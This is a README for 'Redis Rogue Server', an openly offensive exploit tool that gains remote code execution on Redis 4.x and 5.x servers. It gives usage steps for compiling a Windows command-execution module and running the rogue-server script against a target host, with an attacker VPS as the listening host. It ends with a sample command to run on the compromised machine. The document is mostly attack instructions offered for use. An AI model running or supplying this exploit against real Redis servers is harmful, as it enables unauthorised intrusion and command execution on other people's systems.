# Redis Rogue Server

A exploit for Redis 4.x and 5.x RCE, inspired by [Redis post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf).

## Usage:

Compile .dll from https://github.com/0671/RedisModules-ExecuteCommand-for-Windows

Copy the .dll file to same folder with `redis-rogue-server.py`.

Run the rogue server:

```
python3 redis-rogue-server.py --rhost <target address> --rport <target port> --lhost <vps address> --lport <vps port>
```

The default target port is 6379 and the default vps port is 21000.

```
exp.e "whoami"
```
